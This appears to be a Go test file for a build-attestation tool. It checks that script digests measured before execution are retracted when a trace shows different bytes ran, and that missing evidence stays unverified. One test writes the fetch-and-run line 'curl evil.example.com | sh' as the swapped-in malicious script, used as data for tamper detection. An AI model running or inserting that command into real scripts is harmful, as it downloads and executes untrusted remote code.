// Copyright 2026 The Rookery Contributors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package commandrun

import (
	"context"
	"crypto"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/aflock-ai/rookery/attestation/cryptoutil"
)

// digestOf is the digest the trace would report for these bytes.
func digestOf(t *testing.T, body string) cryptoutil.DigestSet {
	t.Helper()
	ds, err := cryptoutil.CalculateDigestSetFromBytes([]byte(body), defaultScriptDigests())
	if err != nil {
		t.Fatal(err)
	}
	return ds
}

// tracedRun builds a CommandRun whose trace claims to have observed path being
// read with the given digest.
func tracedRun(scripts []ScriptRef, observed map[string]cryptoutil.DigestSet) *CommandRun {
	return &CommandRun{
		Scripts:       scripts,
		enableTracing: true,
		Processes:     []ProcessInfo{{ProcessID: 1, OpenedFiles: observed}},
	}
}

// TestExecutionBindingRenameBetweenCaptureAndExec is the case the whole field
// exists for: the script is measured, then REPLACED, and the trace reports the
// bytes that actually ran.
//
// Before this, the attestor signed the pre-exec digest with nothing marking it
// as a pre-exec digest, so a verifier read "script X ran" when script Y ran. The
// digest must be RETRACTED, not annotated — a signed digest outlives the caveat
// printed beside it.
func TestExecutionBindingRenameBetweenCaptureAndExec(t *testing.T) {
	dir := t.TempDir()
	script := filepath.Join(dir, "build.sh")
	captured := "#!/bin/sh\necho benign\n"
	executed := "#!/bin/sh\ncurl evil.example.com | sh\n"

	if err := os.WriteFile(script, []byte(captured), 0o600); err != nil {
		t.Fatal(err)
	}

	// Capture happens before exec, exactly as Attest does it.
	refs := captureScriptRefs(context.Background(), []string{"sh", "build.sh"}, dir, ScriptCaptureContent)
	if len(refs) != 1 || len(refs[0].Digest) == 0 {
		t.Fatalf("capture did not measure the script: %+v", refs)
	}
	if refs[0].ExecutionBinding != ScriptBindingUnverified {
		t.Fatalf("a capture-time measurement must start unverified, got %q", refs[0].ExecutionBinding)
	}
	capturedDigest := refs[0].Digest

	// THE SWAP. The file is genuinely replaced on disk between measurement and
	// execution; the trace reports what the kernel actually read.
	if err := os.WriteFile(script, []byte(executed), 0o600); err != nil {
		t.Fatal(err)
	}

	rc := tracedRun(refs, map[string]cryptoutil.DigestSet{
		refs[0].Path: digestOf(t, executed),
	})
	rc.bindScriptsToTrace()

	got := rc.Scripts[0]
	if got.ExecutionBinding != ScriptBindingMismatch {
		t.Errorf("binding = %q, want %q", got.ExecutionBinding, ScriptBindingMismatch)
	}
	// The load-bearing assertion: ABSENT, not flagged.
	if len(got.Digest) != 0 {
		t.Errorf("the captured digest describes bytes that did not run and must be "+
			"withheld, not published with a warning; got %v", got.Digest)
	}
	if got.SizeBytes != 0 || got.Content != "" {
		t.Errorf("size and content derive from the retracted measurement and must go "+
			"with it: size=%d content=%q", got.SizeBytes, got.Content)
	}
	if got.Unresolved == "" {
		t.Error("a retraction must say why, or it is indistinguishable from never having looked")
	}
	// And the digest that was withheld must not survive anywhere in the record.
	blob, err := json.Marshal(got)
	if err != nil {
		t.Fatal(err)
	}
	for _, hex := range capturedDigest {
		if hex != "" && strings.Contains(string(blob), hex) {
			t.Errorf("the retracted digest %q still appears in the marshalled ref: %s", hex, blob)
		}
	}
}

// TestExecutionBindingVerifiedWhenTraceAgrees is the counterweight. A binding
// scheme that never says "verified" is just a slower way of saying nothing.
func TestExecutionBindingVerifiedWhenTraceAgrees(t *testing.T) {
	dir := t.TempDir()
	body := "#!/bin/sh\necho hi\n"
	if err := os.WriteFile(filepath.Join(dir, "build.sh"), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}

	refs := captureScriptRefs(context.Background(), []string{"sh", "build.sh"}, dir, ScriptCaptureIdentity)
	if len(refs) != 1 {
		t.Fatalf("expected 1 ref, got %+v", refs)
	}

	rc := tracedRun(refs, map[string]cryptoutil.DigestSet{
		refs[0].Path: digestOf(t, body), // the file did NOT change
	})
	rc.bindScriptsToTrace()

	got := rc.Scripts[0]
	if got.ExecutionBinding != ScriptBindingVerified {
		t.Errorf("binding = %q, want %q", got.ExecutionBinding, ScriptBindingVerified)
	}
	if len(got.Digest) == 0 {
		t.Error("a verified binding must KEEP the digest — it is the thing being bound")
	}
}

// TestExecutionBindingStaysUnverifiedWithoutProof enumerates every way the trace
// can fail to speak to a path. All of them must land on unverified, and none of
// them may be mistaken for agreement.
//
// This is the regression surface that matters most. Each case below is a place
// where "the trace said nothing" could be misread as "the trace said it matched",
// and that misreading would mint a false positive under signature.
func TestExecutionBindingStaysUnverifiedWithoutProof(t *testing.T) {
	dir := t.TempDir()
	body := "#!/bin/sh\necho hi\n"
	if err := os.WriteFile(filepath.Join(dir, "build.sh"), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	capture := func() []ScriptRef {
		refs := captureScriptRefs(context.Background(), []string{"sh", "build.sh"}, dir, ScriptCaptureIdentity)
		if len(refs) != 1 || len(refs[0].Digest) == 0 {
			t.Fatalf("capture failed: %+v", refs)
		}
		return refs
	}

	t.Run("tracing disabled", func(t *testing.T) {
		refs := capture()
		rc := &CommandRun{Scripts: refs, enableTracing: false}
		rc.bindScriptsToTrace()
		if rc.Scripts[0].ExecutionBinding != ScriptBindingUnverified {
			t.Errorf("binding = %q, want unverified", rc.Scripts[0].ExecutionBinding)
		}
		if len(rc.Scripts[0].Digest) == 0 {
			t.Error("an unbound digest is still useful evidence and must survive")
		}
	})

	t.Run("no traced processes at all", func(t *testing.T) {
		refs := capture()
		rc := &CommandRun{Scripts: refs, enableTracing: true}
		rc.bindScriptsToTrace()
		if rc.Scripts[0].ExecutionBinding != ScriptBindingUnverified {
			t.Errorf("binding = %q, want unverified", rc.Scripts[0].ExecutionBinding)
		}
	})

	// THE BLIND SPOT. The tracer skips reads under temp and cache directories
	// and records no entry and no gap for them — and wrapper scripts, the very
	// thing this attestor most wants to bind, are written to temp directories.
	// A future "absent means unchanged" shortcut would turn every one of them
	// into a false verified.
	t.Run("path skipped by the tracer (temp dir blind spot)", func(t *testing.T) {
		refs := capture()
		rc := tracedRun(refs, map[string]cryptoutil.DigestSet{
			// The trace saw OTHER files, just not this one.
			filepath.Join(dir, "unrelated.txt"): digestOf(t, "something else"),
		})
		rc.bindScriptsToTrace()
		if rc.Scripts[0].ExecutionBinding != ScriptBindingUnverified {
			t.Errorf("a read the tracer skipped must stay unverified, never verified; got %q",
				rc.Scripts[0].ExecutionBinding)
		}
		if len(rc.Scripts[0].Digest) == 0 {
			t.Error("a skipped read is not evidence of tampering — the digest must survive")
		}
	})

	// ptrace keys OpenedFiles on the raw relative token while the capture path
	// is absolute. A fuzzy match across those forms would credit one file's
	// digest to another file's path, so the mismatch in key form must simply
	// yield no binding.
	t.Run("trace keyed the path in a different form", func(t *testing.T) {
		refs := capture()
		rc := tracedRun(refs, map[string]cryptoutil.DigestSet{
			"build.sh": digestOf(t, body), // relative, as ptrace records it
		})
		rc.bindScriptsToTrace()
		if rc.Scripts[0].ExecutionBinding != ScriptBindingUnverified {
			t.Errorf("binding = %q, want unverified — an exact-key miss is not a match",
				rc.Scripts[0].ExecutionBinding)
		}
	})

	t.Run("nothing was measured, so nothing binds", func(t *testing.T) {
		refs := []ScriptRef{{
			Path:             filepath.Join(dir, "gone.sh"),
			Role:             RoleInterpreterOperand,
			Unresolved:       "file does not exist at attest time",
			ExecutionBinding: ScriptBindingUnverified,
		}}
		rc := tracedRun(refs, map[string]cryptoutil.DigestSet{
			filepath.Join(dir, "gone.sh"): digestOf(t, body),
		})
		rc.bindScriptsToTrace()
		if rc.Scripts[0].ExecutionBinding != ScriptBindingUnverified {
			t.Errorf("binding = %q, want unverified", rc.Scripts[0].ExecutionBinding)
		}
	})
}

// TestClassifyBindingSeparatesIgnoranceFromDisagreement pins the distinction
// cryptoutil.DigestSet.Equal cannot express.
//
// Equal is a two-way predicate and returns false BOTH for "the bytes differ" and
// for "there is no shared algorithm to compare on". Wiring it in directly would
// report MISMATCH whenever the trace recorded a different algorithm than the
// capture did — retracting a good digest and accusing an innocent build. Nothing
// may be called a mismatch until it has been shown to be comparable.
func TestClassifyBindingSeparatesIgnoranceFromDisagreement(t *testing.T) {
	sha256Of := func(s string) cryptoutil.DigestSet { return digestOf(t, s) }

	sha512Set := func(s string) cryptoutil.DigestSet {
		ds, err := cryptoutil.CalculateDigestSetFromBytes([]byte(s),
			[]cryptoutil.DigestValue{{Hash: crypto.SHA512}})
		if err != nil {
			t.Fatal(err)
		}
		return ds
	}

	for _, tc := range []struct {
		name               string
		captured, observed cryptoutil.DigestSet
		want               ScriptExecutionBinding
	}{
		{"same bytes, same algorithm", sha256Of("a"), sha256Of("a"), ScriptBindingVerified},
		{"different bytes, same algorithm", sha256Of("a"), sha256Of("b"), ScriptBindingMismatch},
		{
			// The case Equal alone gets wrong: no overlap, so no verdict.
			name:     "no shared algorithm is ignorance, not tampering",
			captured: sha256Of("a"), observed: sha512Set("b"),
			want: ScriptBindingUnverified,
		},
		{"empty observed set", sha256Of("a"), cryptoutil.DigestSet{}, ScriptBindingUnverified},
		{"empty captured set", cryptoutil.DigestSet{}, sha256Of("a"), ScriptBindingUnverified},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := classifyBinding(tc.captured, tc.observed); got != tc.want {
				t.Errorf("classifyBinding = %q, want %q", got, tc.want)
			}
		})
	}
}

// TestExecutionBindingIsAlwaysEmitted pins the missing omitempty.
//
// A status that vanishes when it is "unverified" makes absence ambiguous — an
// unbound digest becomes indistinguishable from a producer that predates the
// field, and the convenient reading of an ambiguous claim is the wrong one. It
// must appear on every ref this attestor writes.
func TestExecutionBindingIsAlwaysEmitted(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "build.sh"), []byte("echo hi\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	refs := captureScriptRefs(context.Background(), []string{"sh", "build.sh"}, dir, ScriptCaptureIdentity)
	if len(refs) != 1 {
		t.Fatalf("expected 1 ref, got %+v", refs)
	}

	blob, err := json.Marshal(refs[0])
	if err != nil {
		t.Fatal(err)
	}
	var decoded map[string]any
	if err := json.Unmarshal(blob, &decoded); err != nil {
		t.Fatal(err)
	}
	got, present := decoded["executionBinding"]
	if !present {
		t.Fatalf("executionBinding must be emitted even when unverified: %s", blob)
	}
	if got != string(ScriptBindingUnverified) {
		t.Errorf("executionBinding = %v, want %q", got, ScriptBindingUnverified)
	}

	// THE CASE omitempty WOULD SWALLOW. An `omitempty` tag drops only the empty
	// string, so it is invisible for the three real values — which is exactly
	// what makes it dangerous to add later. Its damage shows up on a ScriptRef
	// that never got a binding assigned: the key disappears, and a record with
	// an UNSET binding becomes byte-identical to one from a producer that
	// predates the field. Emitting `""` instead is loud, and a consumer can
	// reject it. Silence cannot be rejected because it cannot be seen.
	unset, err := json.Marshal(ScriptRef{Path: "/w/x.sh", Role: RoleInterpreterOperand})
	if err != nil {
		t.Fatal(err)
	}
	var unsetDecoded map[string]any
	if err := json.Unmarshal(unset, &unsetDecoded); err != nil {
		t.Fatal(err)
	}
	if _, ok := unsetDecoded["executionBinding"]; !ok {
		t.Errorf("a ScriptRef with no binding assigned must still emit the key, so the "+
			"gap is visible rather than indistinguishable from an older producer: %s", unset)
	}
}

// TestScriptRefBackCompatWithoutBindingField covers the consumer that still
// speaks the old contract: an attestation produced BEFORE this field existed.
//
// It must still decode, and it must NOT decode into anything that reads as a
// binding. The zero value is the empty string, which is not "verified" — so an
// old record cannot be mistaken for a bound one by a policy checking the value.
func TestScriptRefBackCompatWithoutBindingField(t *testing.T) {
	// A v0.2 scripts entry exactly as an older producer wrote it.
	const old = `{"path":"/w/build.sh","role":"interpreter-operand",` +
		`"digest":{"sha256":"abc123"},"sizeBytes":42}`

	var ref ScriptRef
	if err := json.Unmarshal([]byte(old), &ref); err != nil {
		t.Fatalf("an attestation predating this field must still decode: %v", err)
	}
	if ref.Path != "/w/build.sh" || ref.SizeBytes != 42 {
		t.Errorf("existing fields did not survive: %+v", ref)
	}
	if ref.ExecutionBinding == ScriptBindingVerified {
		t.Fatal("an absent binding decoded as VERIFIED — silence must never grant proof")
	}
	if ref.ExecutionBinding != "" {
		t.Errorf("expected the zero value for an absent field, got %q", ref.ExecutionBinding)
	}
}

// TestExecutionBindingSurvivesPredicateRoundTrip checks the field actually
// reaches the signed wire shape rather than being dropped by the v0.2
// interner — a binding that does not survive marshalling is not evidence.
func TestExecutionBindingSurvivesPredicateRoundTrip(t *testing.T) {
	dir := t.TempDir()
	body := "#!/bin/sh\necho hi\n"
	if err := os.WriteFile(filepath.Join(dir, "build.sh"), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	refs := captureScriptRefs(context.Background(), []string{"sh", "build.sh"}, dir, ScriptCaptureIdentity)
	refs[0].ExecutionBinding = ScriptBindingVerified

	orig := &CommandRun{Cmd: []string{"sh", "build.sh"}, Scripts: refs}
	blob, err := json.Marshal(orig)
	if err != nil {
		t.Fatal(err)
	}

	var back CommandRun
	if err := json.Unmarshal(blob, &back); err != nil {
		t.Fatal(err)
	}
	if len(back.Scripts) != 1 {
		t.Fatalf("scripts did not survive the round trip: %+v", back.Scripts)
	}
	if back.Scripts[0].ExecutionBinding != ScriptBindingVerified {
		t.Errorf("binding = %q, want %q — it did not survive the signed wire shape",
			back.Scripts[0].ExecutionBinding, ScriptBindingVerified)
	}
}
